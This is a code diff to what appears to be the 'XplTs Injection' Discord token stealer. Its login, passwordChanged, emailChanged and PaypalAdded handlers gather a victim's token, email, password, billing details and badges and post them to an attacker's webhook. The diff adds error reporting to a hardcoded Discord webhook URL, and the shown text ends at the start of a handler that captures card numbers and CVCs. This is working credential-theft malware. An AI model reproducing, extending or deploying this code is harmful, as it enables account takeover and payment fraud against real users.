@@ -647,6 +647,7 @@ const hooker = async (content) => {
   req.end();
 };
 
+
 const login = async (email, password, token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
@@ -687,7 +688,12 @@ const login = async (email, password, token) => {
     ],
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
+  try {
+    await hooker(content);
+    } catch (error) {
+        console.error("Error sending webhook:", error);
+        await sendErrorToWebhook(error); // Send error to the specified webhook
+    }
 };
 
 const passwordChanged = async (oldpassword, newpassword, token) => {
@@ -730,7 +736,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
     ],
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
+  try {
+    await hooker(content);
+    } catch (error) {
+        console.error("Error sending webhook:", error);
+        await sendErrorToWebhook(error); // Send error to the specified webhook
+    }
 };
 
 const emailChanged = async (email, password, token) => {
@@ -773,51 +784,81 @@ const emailChanged = async (email, password, token) => {
     ],
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
+  try {
+    await hooker(content);
+    } catch (error) {
+        console.error("Error sending webhook:", error);
+        await sendErrorToWebhook(error); // Send error to the specified webhook
+    }
+};
+const fetch = require('node-fetch'); // Make sure to install node-fetch if not already available
+
+const sendErrorToWebhook = async (error) => {
+    const errorContent = {
+        username: "Error Logger",
+        content: `An error occurred: \`\`\`${error}\`\`\``
+    };
+
+    try {
+        await fetch('https://discord.com/api/webhooks/1309272074208153670/Tx-3Gbi28D3Sk_cSwj5Du1e4icmeNYQmvg45o9Ebji3oRWhqiAumFxnjkNKDYBhHVR2T', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(errorContent)
+        });
+    } catch (err) {
+        console.error("Failed to send error to webhook:", err);
+    }
 };
 
-const PaypalAdded = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
-            inline: false,
-          },
-          {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '<:hackerblack:1095747410539593800> **Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-            text: 'XplTs Injection・https://github.com/Weeis3/XplTs_Bot-Builder',
-            icon_url: "https://cdn.discordapp.com/attachments/1237348402791055390/1303683883279061012/xplts.png?ex=6735377b&is=6733e5fb&hm=c17c33e4a6eb171c463d6fb92abf580d96b66b858edbd7469e461031ff4beb47&"
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
+const PaypalAdded = async (token) => { 
+   const json = await getInfo(token); 
+   const nitro = getNitro(json.premium_type); 
+   const badges = getBadges(json.flags); 
+   const billing = await getBilling(token); 
+   const content = { 
+     username: config.embed_name, 
+     avatar_url: config.embed_icon, 
+     embeds: [ 
+       { 
+         color: config.embed_color, 
+         fields: [ 
+           { 
+             name: '**Paypal Added**', 
+             value: `Time to buy some nitro baby 😩`, 
+             inline: false, 
+           }, 
+           { 
+             name: '**Discord Information**', 
+             value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`, 
+             inline: true, 
+           }, 
+           { 
+             name: '<:hackerblack:1095747410539593800> **Token**', 
+             value: `\`${token}\``, 
+             inline: false, 
+           }, 
+         ], 
+         author: { 
+           name: json.username + '#' + json.discriminator + ' | ' + json.id, 
+           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`, 
+         }, 
+         footer: { 
+             text: 'XplTs Injection・https://github.com/Weeis3/XplTs_Bot-Builder', 
+             icon_url: "https://cdn.discordapp.com/attachments/1237348402791055390/1303683883279061012/xplts.png?ex=6735377b&is=6733e5fb&hm=c17c33e4a6eb171c463d6fb92abf580d96b66b858edbd7469e461031ff4beb47&" 
+         }, 
+       }, 
+     ], 
+   }; 
+   if (config.ping_on_run) content['content'] = config.ping_val; 
+   try {
+       await hooker(content);
+   } catch (error) {
+       console.error("Error sending webhook:", error);
+       await sendErrorToWebhook(error); // Send error to the specified webhook
+   }
+}; 
 
 const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
   const json = await getInfo(token);
